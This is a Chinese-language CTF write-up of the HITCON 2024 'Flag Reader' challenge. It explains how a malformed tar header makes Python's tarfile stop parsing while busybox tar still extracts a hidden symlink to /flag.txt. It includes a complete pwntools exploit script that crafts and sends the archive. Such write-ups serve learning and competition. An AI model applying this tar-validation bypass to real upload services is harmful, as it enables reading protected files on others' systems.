---
title: "HITCON CTF 2024 Writeup"
date: 2024-07-28T00:00:00+08:00
draft: false
github_link: "https://github.com/Jimmy01240397/CTF-writeup"
author: "Chumy"
tags:
  - CTF
image: /images/CTF.png
description: ""
toc: 
---

# hitconctf-2024-writeup

這場與 `星爆吉娃娃`、`BambooFox`、以及我們 `B33f 50UP` 所組成的 `星爆牛炒竹狐` 隊伍一起打到了世界第 24 名、台灣排名第一名，並且打進今年 HITCON CTF 決賽。

這邊就來寫一下我解的題目 writeup。

## 戰績

![image](https://github.com/user-attachments/assets/1f60d911-041b-4419-9eb3-b1cfe0e46feb)

![image](https://github.com/user-attachments/assets/4278d28e-9f26-4ef1-9ebb-443a0a18adce)

![image](https://github.com/user-attachments/assets/fb014145-7e99-4cb2-8f6d-b3e50ee87d4d)

![image](https://github.com/user-attachments/assets/f33a0522-3ffc-4306-a5f3-b9f7a180bb7b)

## Flag Reader

![image](https://github.com/user-attachments/assets/a3a33711-1427-4d0b-ab7b-c1c11c218d55)

目標是上傳一個帶有 flag.txt -> /flag.txt 的 symlink，但是 server 的 python 會用 tarfile 做一次 tarinfo 的檢查，檢查一定要是 file 且名字不能帶 flag.txt，檢查過才會用 subprocess 跑 busybox tar 去解檔。

首先我先去看[tarfile 定義為 isfile 的檔案類型](https://github.com/python/cpython/blob/b455a5a55cb1fd5bb6178a969e8ebd0e6e91b610/Lib/tarfile.py#L122)

```python
REGULAR_TYPES = (REGTYPE, AREGTYPE,
                 CONTTYPE, GNUTYPE_SPARSE)
```

發現 typebyte 要設成 `\0`、`0`、`7`、`S` isfile 結果才會是 true。

最一開始我注意到 `S` 這個東西，發現是 [GNU 特有的 type](https://www.gnu.org/software/tar/manual/html_section/Sparse-Formats.html) 但是不知道為何我用自己 linux 測以後，發現 `tarfile` 會認 Sparse file 但是 `tar` 不知道為何還是按照一般的檔案去解，這邊可能有待研究。

反正我先建了一個 tar 包了兩個檔案，一個是一個動過手腳的空 Sparse file 一個就 flag 的 symlink，這邊的製作方式是。

```bash
touch 1
ln -s /flag.txt flag.txt
tar cvf 1 flag.txt
```

接著用 Hex editer 改，把 header offset 482 的 isextended 設成 true （非 \0）這樣他就會多讀一個 Block 作為 Sparse 的 extend header，那那個 Block 原本是放 flag.txt 的 header 就會被蓋掉，這樣 `tarfile` 就只會認出個檔案而已，但是因為上面講的 tar 沒認 Sparse file 所以她解開就會把兩個檔案都解開，應該就能繞過檢查。

但是發現失敗了，自己架一次以後發現原因出在 [busybox tar 的這個位置](https://github.com/brgl/busybox/blob/abbf17abccbf832365d9acf1c280369ba7d5f8b2/archival/libarchive/get_header_tar.c#L432)可以發現他沒有實作 Sparse file，然後遇到沒有實作的 type 就會直接 Crash。

因此我開始找別的突破點，後來發現。

我們可以去比對 python tarfile 跟 busybox tar 的 source code 裡面讀取數字的地方。
[tarfile](https://github.com/python/cpython/blob/3.12/Lib/tarfile.py#L175)
[busybox tar](https://git.busybox.net/busybox/tree/archival/libarchive/get_header_tar.c?h=1_36_stable#n21)

可以發現兩邊的行為有很多不一致，其中有一個地方是 busybox tar 那邊取數字的取法是把該 field 範圍的字串用 `strtoull` 以 base 8 轉成 `unsigned long long`，而 `strtoull` 會從 low byte 開始讀數字，讀到第一個非數字為止，而接下來會做判斷。

```c
v = strtoull(str, &end, 8);
/* std: "Each numeric field is terminated by one or more
 * <space> or NUL characters". We must support ' '! */
if (*end != '\0' && *end != ' ') {
```

可以看到他會檢查非數字如果是 '\0' 或 ' ' 就不會走進 if，而裡面是處理大數字時改為用 base 256 計算的方式。也就是說如果我們把數字的 field 改成 `0 1111111` 這類的，他會得到 `0`。

接著看一下 `tarfile` 的 `nti`。

```python
def nts(s, encoding, errors):
    """Convert a null-terminated bytes object to a string.
    """
    p = s.find(b"\0")
    if p != -1:
        s = s[:p]
    return s.decode(encoding, errors)

def nti(s):
# .....................
    else:
        try:
            s = nts(s, "ascii", "strict")
            n = int(s.strip() or "0", 8)
        except ValueError:
            raise InvalidHeaderError("invalid header")
# .....................
```

可以看到他會先找到第一個 '\0' 以後將前面的 byte 做 decode 以後用 int 以 base 8 轉成整數，那如果按照上面用 `0 1111111` 會發生甚麼事情。

```
>>> int('0 11111', 8)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
ValueError: invalid literal for int() with base 8: '0 11111'
```

可以發現他會直接 `ValueError` 而 `ValueError` 會 raise `InvalidHeaderError`

接著去看 `TarFile.next` 


```python
tarinfo = None
while True:
    try:
        tarinfo = self.tarinfo.fromtarfile(self)
    except EOFHeaderError as e:
        if self.ignore_zeros:
            self._dbg(2, "0x%X: %s" % (self.offset, e))
            self.offset += BLOCKSIZE
            continue
    except InvalidHeaderError as e:
        if self.ignore_zeros:
            self._dbg(2, "0x%X: %s" % (self.offset, e))
            self.offset += BLOCKSIZE
            continue
        elif self.offset == 0:
            raise ReadError(str(e)) from None
#...............................
    break

if tarinfo is not None:
    self.members.append(tarinfo)
else:
    self._loaded = True

return tarinfo
```

可以發現如果 `InvalidHeaderError` 且 `self.offset != 0` 也就是不是第一個 block 的時候就會停止讀取。所以如果我在第二個檔案的 tar header 裡隨便找個數字並塞個 space 的話，`tarfile` 就會只認出一個檔案，這時如果我把 `flag.txt` 的 symlink 放在第二個檔案以後，`tarfile` 就不會檢查到，同時又可以被 busybox 的 `tar` 解出來。這樣就能繞過檢查了。

exploit:

```python
from pwn import *
import subprocess
from pathlib import Path
from tempfile import TemporaryDirectory
import base64
import sys

BLOCK_SIZE = 512

def calculate_tar_checksum(header):
    if len(header) != BLOCK_SIZE:
        raise ValueError(f"Header must be exactly {BLOCK_SIZE} bytes.")

    checksum = 0

    for i in range(BLOCK_SIZE):
        if 148 <= i < 156:
            checksum += 32
        else:
            checksum += header[i]

    return checksum

with TemporaryDirectory() as tmpdir:
    subprocess.run(
        ["touch", '1'],
        check=True,
        cwd=tmpdir,
    )
    subprocess.run(
        ["touch", '2'],
        check=True,
        cwd=tmpdir,
    )
    subprocess.run(
        ["ln", "-s", "/flag.txt", 'flag.txt'],
        check=True,
        cwd=tmpdir,
    )
    subprocess.run(
        ["tar", "cvf", "payload.tar", '1', '2', 'flag.txt'],
        check=True,
        cwd=tmpdir,
    )
    payload = Path(tmpdir) / "payload.tar"
    with open(payload, "rb") as f:
        payloadbytes = f.read()

payloadbytes = bytearray(payloadbytes)
payloadbytes[1 * BLOCK_SIZE + 0x7D] = ord(' ')
payloadbytes = bytes(payloadbytes)
header_block = payloadbytes[1 * BLOCK_SIZE:2 * BLOCK_SIZE]
checksum = oct(calculate_tar_checksum(header_block))[2:].zfill(6)
payloadbytes = bytearray(payloadbytes)
for i in range(len(checksum)):
    payloadbytes[1 * BLOCK_SIZE + 0x94 + i] = ord(checksum[i])
payloadbytes = bytes(payloadbytes)

payloadbase64 = base64.b64encode(payloadbytes)
conn = remote(sys.argv[1], int(sys.argv[2]))
conn.sendline(payloadbase64)
print(conn.recvuntil(b'\n\n'))
```

![image](https://hackmd.io/_uploads/S1rBTNfu0.png)

`hitcon{is_it_still_possible_if_I_banned_the_presense_of_flag.txt_in_the_binary_data_of_the_tar_file?}`

## 其他隊友的 writeup

[Hackmd](https://hackmd.io/@Vincent550102/rydOoLWOR)

